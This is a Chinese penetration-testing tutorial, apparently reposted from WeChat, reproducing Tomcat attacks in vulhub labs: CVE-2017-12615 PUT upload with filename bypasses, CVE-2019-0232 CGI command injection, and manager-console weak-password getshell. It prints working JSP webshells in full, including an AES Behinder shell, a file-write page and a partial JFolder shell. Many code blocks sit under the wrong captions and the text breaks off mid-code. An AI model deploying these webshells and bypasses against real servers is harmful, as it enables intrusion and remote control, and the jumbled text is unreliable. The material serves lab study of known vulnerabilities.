> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7kK91GfYtpVtTlIpo9N_2w)

前言
--

Tomcat 服务器是一个免费的开放源代码的 web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试 JSP 程序的首选。可以这样认为，当在一台机器上配置好 Apache 服务器，可利用它响应 HTML 页面的访问请求。实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当运行 tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。

**目前版本型号 7-10 版本**

**默认端口：8080**

安装
--

首先要有 java 的环境

**注意：Tomcat 的版本对与 JAVA 版本以及相应的 JSP 和 Servlet 都是有要求的，Tomcat8 版本以上的是需要 Java7 及以后的版本，所以需要对应 JDK 的版本来下载 Tomcat 的版本**

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QacG69ia0BKv3vuYBnicSupVcxg1HXFceQl6II3LKSBtBlpyApO15F1K2A/640?wx_fmt=jpeg)

然后安装 Tomcat 一路默认下来 就 ok 了

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QabXicyvwE46DPfgLBpBP52HNJVXwZsohzBJrPK5ia8Aa4RWRcZpszn1cg/640?wx_fmt=jpeg)

可以看到它的 8080 端口 已经开启了

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaiccEia8AjV7ASO770EtsvDtSISVlNF3DTrlrRSKQuXvyVsc2icp2iblqAA/640?wx_fmt=jpeg)

访问一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaDN48eMV3eicEdfk8eHOg1ibeSrxUgxunDCCE0Lib0WdlMxhX89iaSibCEOw/640?wx_fmt=jpeg)

Tomcat 分析
---------

### 主要文件

```
sudo service docker start 
cd vulhub/tomcat/CVE-2017-12615
sudo docker-compose build
sudo docker-compose up -d

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa3TGWec6YAiaVsOtEKibYtlpIfo8uh3NWIxQpeUhQJhqGSdicN7IZ8rN7w/640?wx_fmt=jpeg)

### 上传目录

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QalaTeJGgmVQtOTDql0Z1v2eEicPWLLnaONd0icibPo4EEBVL3TvxrkQD7g/640?wx_fmt=jpeg)

Tomcat 渗透
---------

### Tomcat 任意文件写入 (CVE-2017-12615）

#### 影响范围

Apache Tomcat7.0.0-7.0.81（默认配置）

#### 复现

这边我用 vulhub

```
sudo docker ps
sudo docker exec -ti a3 bash
cat conf/web.xml |grep readonly

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaEVlWXcvs50LSia5aBV5tYOXE9xtlPZhNKy3FxTCQkt7rFILRGUlI9eQ/640?wx_fmt=jpeg)

去底层看看源码

```
/usr/local/tomcat/webapps/ROOT

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa5omIQt2UwsLjto1xYwqVZqQXXibyQDribgaJxtkBKLdDSd0ICgxmKhZA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaW2P9wDYia1kTW0R1MUP2F8vRdsERXkVaibeHRlMt0F90UJHicosA9LYLg/640?wx_fmt=jpeg)

#### 漏洞原理

产生是由于配置不当（非默认配置），将配置文件`conf/web.xml`中的`readonly`设置为了 false，导致可以使用 PUT 方法上传任意文件，但限制了 jsp 后缀，不过对于不同平台有多种绕过方法

#### 开始复现

抓包 改位 PUT 上传方式

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaxqcWorv8wibgiciaaXDHGxR1DjKHDm1cPhrvgAnrpoBibRC647t3Yyl6jA/640?wx_fmt=jpeg)

去上传目录看看

```
1.Windows下不允许文件以空格结尾
以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
2.WindowsNTFS流
Put/a001.jsp::$DATA HTTP/1.1
3. /在文件名中是非法的，也会被去除（Linux/Windows）
Put/a001.jsp/http:/1.1

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QagtSPHPz6O8MqMUt67sIAsaHxyICyIgicHvvic5bpRSDhScYBiaGEVPKbA/640?wx_fmt=jpeg)

成功上传

##### 绕过，成功上传 jsp

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>

```

可以看到上传 a001.jsp 是成功绕过了

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaBgkwv01KeceCicBGWicvmkHXyiaGSlae4PdnvQO4XgvrXNY4OMOuiapPCA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa55DWlicZtNEz7MVkbx038YwD2DJPaXGCXPxSkBJYtZfvxxTlhiaakxwg/640?wx_fmt=jpeg)

其他两种我就不进行演示了

都是可以的

上传马儿，这边我用冰蝎进行连接

**注意：不能开代理**

看看冰蝎 server 目录下的 jsp 马儿

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa89ia5PibnxCdoQZjwjPuHF1bDNypY90J0KV4A5noh0WDExjL1AeKfT1Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QafsD1ibnmNYvp66KlqJp5MTFKUsDG3rFVvpXoAHkibvZE8BJ8NAB5ic4OQ/640?wx_fmt=jpeg)

冰蝎的 jsp 马儿

```
/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/

```

```
<init-param>
 <param-name>readonly</param-name>
 <param-value>false</param-value>
</init-param>

```

注意这边要用`/`进行绕过, 上传 jsp

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaHMgOdHgtfZIhyO7iaMjFdxa12FzCEdSRfmGLTxaeDEDXzR9LGuhA6cw/640?wx_fmt=jpeg)

也可以看到是成功上传的

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QakIyoDvlDoP60RC56Ez6erV8fAXFsEsGjpSVGZgvd6GT6EvNS6Ex5QQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaLxrhKZR4vZpgtzNYdATmEmoH2Tf8mWQt6LstchLHNsrnlGvlqHMcAw/640?wx_fmt=jpeg)

用冰蝎进行连接一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaCZEezBd6wJGG9TuJfNlY6xSCB6a5CfHxlLxTU7RKMbkiaX2xJIwrcicw/640?wx_fmt=jpeg)

##### 最新版本复现

这边把这个漏洞的代码 粘贴进最新的版本

不加的话 PUT 上传 txt 都是不可以的

```
<init-param>
 <param-name>readonly</param-name>
 <param-value>false</param-value>
</init-param>

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaPsVSutq8lxnPIw9icu6icOMPwgib3h62qjZiaXnJPexsFMWibTHNHVys3lg/640?wx_fmt=jpeg)

保存退出 进行重启 Tomcat

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaPicXVz6O7sia2viaMUORq0MY6ngXJt3vFZic4CiaT85M1rVUdy0RYzMe4LQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QabnjunBbPw2agrRrvxPdjjVib36b0OvfBVv0QMAEq7ViciaXIJYpRkBlDg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaBcEkRspvK9efdibgKKeqkVNRSApllEVD13Jo9ib0sLbzvicO9rM4zxgBA/640?wx_fmt=jpeg)

确实是可以成功写入的

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaxicnUG37AHD51Gx7Q3XTxCxcZPgfI8zEonf8uJKgf5AP4qiaLmFicuDcQ/640?wx_fmt=jpeg)

进行 PUT 写入 txt 发现它是可以的

但是绕过，上传 jsp 三种方法我都试了 是不行的

##### 修复

把 readonly 改成 true

```
<servlet>
    <servlet-name>cgi</servlet-name>
    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
    <init-param>
        <param-name>cgiPathPrefix</param-name>
        <param-value>WEB-INF/cgi</param-value>
    </init-param>
    <init-param>
        <param-name>enableCmdLineArguments</param-name>
        <param-value>true</param-value>
    </init-param>
    <init-param>
        <param-name>executable</param-name>
        <param-value></param-value>
    </init-param>
    <load-on-startup>5</load-on-startup>
</servlet>

```

### Tomcat 远程代码执行（CVE-2019-0232）

#### 影响范围

```
<Context privileged="true">

```

这边就用 Windows 8.5.39 进行复现

#### 安装

同样是先安装 java

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaLQdWk8icSYa3GObyskr6yYeichGFF6ZV4Eq337oMjtIEU0HvIx0w014g/640?wx_fmt=jpeg)

然后安装 Tomcat

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa2ia1rtBJZbCbibIQibrKPBkAfiaU2lYAcQCic2ohbGY0Z8wAibzeficyz2w1Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QahgtX7ZGD6ZXJRvq9CpgWo1VGSDxXMSw34ic5OLGDlLQLkpgOz1gFeXg/640?wx_fmt=jpeg)

访问一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qavf7NxQ9ibW722SDPjicmTd09icxTiaPkSqDSVDnHhnHsNE6pglp1kxXqRQ/640?wx_fmt=jpeg)

漏洞原理

漏洞相关的代码在`tomcat\java\org\apache\catalina\servlets\CGIServlet.java`中，CGISerlvet 提供了一个`cgi`的调用接口，在启用`enableCmdLineArguments`参数时，会根据`RFC 3875`来从 Url 参数中生成命令行参数，并把参数传递至 Java 的`Runtime`执行。

**这个漏洞是因为`Runtime.getRuntime().exec`在 Windows 中和 Linux 中底层实现不同导致的**

Java 的 Runtime.getRuntime().exec 在 CGI 调用这种情况下很难有命令注入。

而 Windows 中创建进程使用的是 CreateProcess，会将参数合并成字符串，作为`lpComandLine`传入 CreateProcess。程序启动后调用`GetcommandLine`获取参数，并调用`CommandLineToArgw`传至 argv

在 Windows 中，当`CreateProcess`中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe，故最后会变成`cmd.exe /c "a001.bat dir"`，而 Java 的调用过程并没有做任何的转义，所以在 Windows 下会存在漏洞。

除此之外，Windows 在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过

例如`dir "\"&whoami"`在 Linux 中是安全的，而在 Windows 会执行命令。  
这是因为 Windows 在处理命令行参数时，会将`"`中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个`"`，但是对`"`的处理有误。因此在 Java 中调用批处理或者 cmd 文件时，需要做合适的参数检査才能避免漏洞岀现。

#### 漏洞分析

Tomcat 的 CGI_Servlet 组件默认是关闭的，在`conf/web.xml`中找到注释的 CGIServlet 部分，去掉注释，并配置 enableCmdLineArguments 和 executable

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaPP4icUSnfheo1XWpA5VPSZ1dgvnNLCaqYX4uDgCPOz0GibQPwfLibvFzA/640?wx_fmt=jpeg)

就是配置这里

```
String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);
if (cmdLineArgumentsDecodedPattern != null &&
 !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) {
 if (log.isDebugEnabled()) {
 log.debug(sm.getString("cgiServlet.invalidArgumentDecoded",
 decodedArgument, cmdLineArgumentsDecodedPattern.toString()));
 }
 return false;
}

```

这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。

1.enableCmdLineArguments 启用后才会将 Url 中的参数传递到命令行  
2.executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。

同样在 conf/web.xml 中启用 cgi 的 servlet-mapping

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaGibfKibC8FUujBic7ZxEwicfOyvrSbaAX6MU1qU4Qdy0QyDUu3QtzfC9ng/640?wx_fmt=jpeg)

修改 conf/context.xml 的添加 privileged=”true” 属性，否则会没有权限

```
if (cgiEnv.isValid()) {
 CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(),
 cgiEnv.getEnvironment(),
 cgiEnv.getWorkingDirectory(),
 cgiEnv.getParameters());
 if ("POST".equals(req.getMethod())) {
 cgi.setInput(req.getInputStream());
 }
 cgi.setResponse(res);
 cgi.run();
} else {
 res.sendError(404);
}

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaJU4Lz93v3sf5BO2xwiajUL13KHVHOk5s5PXYB3Lh2xuzN1UHlI5fJsQ/640?wx_fmt=jpeg)

配置目录文件

在`C:\Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录

并在该目录下创建一个 a001.txt

里面内容随意

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaPG0ick0Ar4GNLRBsIGhibKO6hWBm6KDy1AM7eUicgCwzX8icNUIZuibI29g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QadwNRW8bYpOuHZYHcoVYNO8NKp5jiaTbvZaYO8QrH2GbpkNvvVichqKGg/640?wx_fmt=jpeg)

记得重启一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa403mJwH4Bkk0wQlIXwr2se6ic7Koy1kETKvZPHgm6CUrL7f6pdtLEPg/640?wx_fmt=jpeg)

然后我们访问

```
cd vulhub-master/tomcat/tomcat8

sudo docker-compose up -d

```

可以看到成功任意代码执行！

#### 修复方式

开发者在 patch 中增加了`cmdLineArgumentsDecoded`参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。  
校验写在 setupFromRequest 函数中

```
sudo docker ps
sudo docker exec -ti a bash
cd conf

```

不通过时，会将 CGIEnvironment 的`valid`参数设为 false，在之后的处理函数中会直接跳过执行

```
sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/
sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/
sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/

```

#### 修复建议

1. 使用更新版本的 Apache Tomcat。这里需要注意的是，虽然在 9.0.18 就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然 9.0.18 没有在被影响的列表中，用户仍需要下载 9.0.19 的版本来获得没有该漏洞的版本

2. 关闭 enableCmdLineArguments 参数

### Tomcat 弱口令 & 后台 getshell 漏洞

#### 影响范围

Tomcat8

这边就还是用 vulhub 进行复现

```
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">
 <role role/>
 <role role/>
 <role role/>
 <role role/>
 <role role/>
 <user user />

</tomcat-users>

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa6J5YOHuYPib02W9O52icbxxkzr4Ux30mI6j2e36gB3BLeAU9q0dLYzqw/640?wx_fmt=jpeg)

之前的容器要关掉

去 docker 底层看看它的源码

```
manager-gui     拥有htmL页面权限
manager-status  拥有查看 status的权限
manager-script  拥有text接口的权限，和 status权限
manager-jmx     拥有jmx权限，和 status权限

```

把这三个文件复制出来

```
admin-gui    拥有html页面权限
admin-script 拥有text接口权限

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9Qa9FQ2Hf5Pxd4fXgSZRj0ylFn4pUFwHMbvpJJwzrSrFiaQ9ClMWI0tiaOg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QazED0icdmG8UclAcsw5mkGPuWoEdolm5YkQwibvU3OlJjZg59icQ2JEpeA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaR4z4jhUpeTPkApNzfMPfl1dI4ZKT1cfFYbOcAQnxXvKQscsbMfntjQ/640?wx_fmt=jpeg)

源码

```
<%@page contentType="text/html;charset=gb2312"%>
<%@page import="java.io.*,java.util.*,java.net.*"%>
<html>
  <head>
    <title></title>
    <style type="text/css">
     body { color:red; font-size:12px; background-color:white; }
    </style>
  </head>
  <body>
  <%
   if(request.getParameter("context")!=null)
   {
   String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");
   String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");
   OutputStream pt = null;
        try {
            pt = new FileOutputStream(path);
            pt.write(context.getBytes());
            out.println("<a href='"+request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+request.getRequestURI()+"'><font color='red' title='点击可以转到上传的文件页面!'>上传成功!</font></a>");
        } catch (FileNotFoundException ex2) {
            out.println("<font color='red'>上传失败!</font>");
        } catch (IOException ex) {
            out.println("<font color='red'>上传失败!</font>");
        } finally {
            try {
                pt.close();
            } catch (IOException ex3) {
                out.println("<font color='red'>上传失败!</font>");
            }
        }
}
  %>
    <form >
    <font color="blue">本文件的路径:</font><%out.print(request.getRealPath(request.getServletPath())); %>
    <br>

    <br>

    <font color="blue">上传文件路径:</font><input type="text" size="70" >
    <br>

    <br>

    上传文件内容:<textarea ></textarea>
    <br>

    <br>

    <input type="submit" >
    </form>
  </body>
</html>

```

manager（后台管理）

```
jar -cvf dayu.war dayu.jsp

```

host-manager（虚拟主机管理

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuff

```

访问一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaytctPEv1eCmYzPCem5E4tZtu4maIVv2r5myicb0aukb77XSU8Zz0etA/640?wx_fmt=jpeg)

访问一下它的后台管理地址

```
/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QanDJE6LVEpBMLU5vmmEsrqkl8HmGDpKOvCteGvxuOGpexw9fSgEKwTA/640?wx_fmt=jpeg)

或者点这里

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibnOz2Slh3icgLwEyRibxE9QaDiaYdS53FGQwG35IddibMEWQojtYyiaswlF23fAkcgYpRu0vs2KiauNq8A/640?wx_fmt=jpeg)

它的登录窗口是没有验证码的 直接爆破就可以

默认

```
<%
/**
JFolder V0.9  windows platform
@Filename：JFolder.jsp 
@Description：一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。

@Bugs  :  下载时，中文文件名无法正常显示
*/
%>
<%@ page contentType="text/html;charset=gb2312"%>
<%@page import="java.io.*,java.util.*,java.net.*" %>
<%!
private final static int languageNo=0; //语言版本，0 : 中文；1：英文
String strThisFile="JFolder.jsp";
String[] authorInfo={" <font color=red> 岁月联盟-专用版 </font>"," <font color=red> Thanks for your support - - by Steven Cee http:// </font>"};
String[] strFileManage   = {"文 件 管 理","File Management"};
String[] strCommand      = {"CMD 命 令","Command Window"};
String[] strSysProperty  = {"系 统 属 性","System Property"};
String[] strHelp         = {"帮 助","Help"};
String[] strParentFolder = {"上级目录","Parent Folder"};
String[] strCurrentFolder= {"当前目录","Current Folder"};
String[] strDrivers      = {"驱动器","Drivers"};
String[] strFileName     = {"文件名称","File Name"};
String[] strFileSize     = {"文件大小","File Size"};
String[] strLastModified = {"最后修改","Last Modified"};
String[] strFileOperation= {"文件操作","Operations"};
String[] strFileEdit     = {"修改","Edit"};
String[] strFileDown     = {"下载","Download"};
String[] strFileCopy     = {"复制","Move"};
String[] strFileDel      = {"删除","Delete"};
String[] strExecute      = {"执行","Execute"};
String[] strBack         = {"返回","Back"};
String[] strFileSave     = {"保存","Save"};

public class FileHandler
{
 private String strAction="";
 private String strFile="";
 void FileHandler(String action,String f)
 {

 }
}

public static class UploadMonitor {

  static Hashtable uploadTable = new Hashtable();

  static void set(String fName, UplInfo info) {
   uploadTable.put(fName, info);
  }

  static void remove(String fName) {
   uploadTable.remove(fName);
  }

  static UplInfo getInfo(String fName) {
   UplInfo info = (UplInfo) uploadTable.get(fName);
   return info;
  }
}

public class UplInfo {

  public long totalSize;
  public long currSize;
  public long starttime;
  public boolean aborted;

  public UplInfo() {
   totalSize = 0l;
   currSize = 0l;
   starttime = System.currentTimeMillis();
   aborted = false;
  }

  public UplInfo(int size) {
   totalSize = size;
   currSize = 0;
   starttime = System.currentTimeMillis();
   aborted = false;
  }

  public String getUprate() {
   long time = System.currentTimeMillis() - starttime;
   if (time != 0) {
    long uprate = currSize * 1000 / time;
    return convertFileSize(uprate) + "/s";
   }
   else return "n/a";
  }

  public int getPercent() {
   if (totalSize == 0) return 0;
   else return (int) (currSize * 100 / totalSize);
  }

  public String getTimeElapsed() {
   long time = (System.currentTimeMillis() - starttime) / 1000l;
   if (time - 60l >= 0){
    if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";
    else return time / 60 + ":0" + (time % 60) + "m";
   }
   else return time<10 ? "0" + time + "s": time + "s";
  }

  public String getTimeEstimated() {
   if (currSize == 0) return "n/a";
   long time = System.currentTimeMillis() - starttime;
   time = totalSize * time / currSize;
   time /= 1000l;
   if (time - 60l >= 0){
    if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";
    else return time / 60 + ":0" + (time % 60) + "m";
   }
   else return time<10 ? "0" + time + "s": time + "s";
  }

 }

 public class FileInfo {

  public String name = null, clientFileName = null, fileContentType = null;
  private byte[] fileContents = null;
  public File file = null;
  public StringBuffer sb = new StringBuffer(100);

  public void setFileContents(byte[] aByteArray) {
   fileContents = new byte[aByteArray.length];
   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
  }
}

// A Class with methods used to process a ServletInputStream
public class HttpMultiPartParser {

  private final String lineSeparator = System.getProperty("line.separator", "\n");
  private final int ONE_MB = 1024 * 1;

  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,
    int clength) throws IllegalArgumentException, IOException {
   if (is == null) throw new IllegalArgumentException("InputStream");
   if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(
     "\"" + boundary + "\" is an illegal boundary indicator");
   boundary = "--" + boundary;
   StringTokenizer stLine = null, stFields = null;
   FileInfo fileInfo = null;
   Hashtable dataTable = new Hashtable(5);
   String line = null, field = null, paramName = null;
   boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);
   boolean isFile = false;
   if (saveFiles) { // Create the required directory (including parent dirs)
    File f = new File(saveInDir);
    f.mkdirs();
   }
   line = getLine(is);
   if (line == null || !line.startsWith(boundary)) throw new IOException(
     "Boundary not found; boundary = " + boundary + ", line = " + line);
   while (line != null) {
    if (line == null || !line.startsWith(boundary)) return dataTable;
    line = getLine(is);
    if (line == null) return dataTable;
    stLine = new StringTokenizer(line, ";\r\n");
    if (stLine.countTokens() < 2) throw new IllegalArgumentException(
      "Bad data in second line");
    line = stLine.nextToken().toLowerCase();
    if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(
      "Bad data in second line");
    stFields = new StringTokenizer(stLine.nextToken(), "=\"");
    if (stFields.countTokens() < 2) throw new IllegalArgumentException(
      "Bad data in second line");
    fileInfo = new FileInfo();
    stFields.nextToken();
    paramName = stFields.nextToken();
    isFile = false;
    if (stLine.hasMoreTokens()) {
     field = stLine.nextToken();
     stFields = new StringTokenizer(field, "=\"");
     if (stFields.countTokens() > 1) {
      if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {
       fileInfo.name = paramName;
       String value = stFields.nextToken();
       if (value != null && value.trim().length() > 0) {
        fileInfo.clientFileName = value;
        isFile = true;
       }
       else {
        line = getLine(is); // Skip "Content-Type:" line
        line = getLine(is); // Skip blank line
        line = getLine(is); // Skip blank line
        line = getLine(is); // Position to boundary line
        continue;
       }
      }
     }
     else if (field.toLowerCase().indexOf("filename") >= 0) {
      line = getLine(is); // Skip "Content-Type:" line
      line = getLine(is); // Skip blank line
      line = getLine(is); // Skip blank line
      line = getLine(is); // Position to boundary line
      continue;
     }
    }
    boolean skipBlankLine = true;
    if (isFile) {
     line = getLine(is);
     if (line == null) return dataTable;
     if (line.trim().length() < 1) skipBlankLine = false;
     else {
      stLine = new StringTokenizer(line, ": ");
      if (stLine.countTokens() < 2) throw new IllegalArgumentException(
        "Bad data in third line");
      stLine.nextToken(); // Content-Type
      fileInfo.fileContentType = stLine.nextToken();
     }
    }
if (skipBlankLine) {
     line = getLine(is);
     if (line == null) return dataTable;
    }
    if (!isFile) {
     line = getLine(is);
     if (line == null) return dataTable;
     dataTable.put(paramName, line);
     // If parameter is dir, change saveInDir to dir
     if (paramName.equals("dir")) saveInDir = line;
     line = getLine(is);
     continue;
    }
    try {
     UplInfo uplInfo = new UplInfo(clength);
     UploadMonitor.set(fileInfo.clientFileName, uplInfo);
     OutputStream os = null;
     String path = null;
     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,
       fileInfo.clientFileName));
     else os = new ByteArrayOutputStream(ONE_MB);
     boolean readingContent = true;
     byte previousLine[] = new byte[2 * ONE_MB];
     byte temp[] = null;
     byte currentLine[] = new byte[2 * ONE_MB];
     int read, read3;
     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {
      line = null;
      break;
     }
     while (readingContent) {
      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {
       line = null;
       uplInfo.aborted = true;
       break;
      }
      if (compareBoundary(boundary, currentLine)) {
       os.write(previousLine, 0, read - 2);
       line = new String(currentLine, 0, read3);
       break;
      }
      else {
       os.write(previousLine, 0, read);
       uplInfo.currSize += read;
       temp = currentLine;
       currentLine = previousLine;
       previousLine = temp;
       read = read3;
      }//end else
     }//end while
     os.flush();
     os.close();
     if (!saveFiles) {
      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
      fileInfo.setFileContents(baos.toByteArray());
     }
     else fileInfo.file = new File(path);
     dataTable.put(paramName, fileInfo);
     uplInfo.currSize = uplInfo.totalSize;
    }//end try
    catch (IOException e) {
     throw e;
    }
   }
   return dataTable;
  }

  /**
   * Compares boundary string to byte array
   */
  private boolean compareBoundary(String boundary, byte ba[]) {
   byte b;
   if (boundary == null || ba == null) return false;
   for (int i = 0; i < boundary.length(); i++)
    if ((byte) boundary.charAt(i) != ba[i]) return false;
   return true;
  }

  /** Convenience method to read HTTP header lines */
  private synchronized String getLine(ServletInputStream sis) throws IOException {
   byte b[] = new byte[1024];
   int read = sis.readLine(b, 0, b.length), index;
   String line = null;
   if (read != -1) {
    line = new String(b, 0, read);
    if ((index = line.indexOf('\n')) >= 0) line = line.substring(0, index - 1);
   }
   return line;
  }

  public String getFileName(String dir, String fileName) throws IllegalArgumentException {
   String path = null;
   if (dir == null || fileName == null) throw new IllegalArgumentException(
     "dir or fileName is null");
   int index = fileName.lastIndexOf('/');
   String name = null;
   if (index >= 0) name = fileName.substring(index + 1);
   else name = fileName;
   index = name.lastIndexOf('\\');
   if (index >= 0) fileName = name.substring(index + 1);
   path = dir + File.separator + fileName;
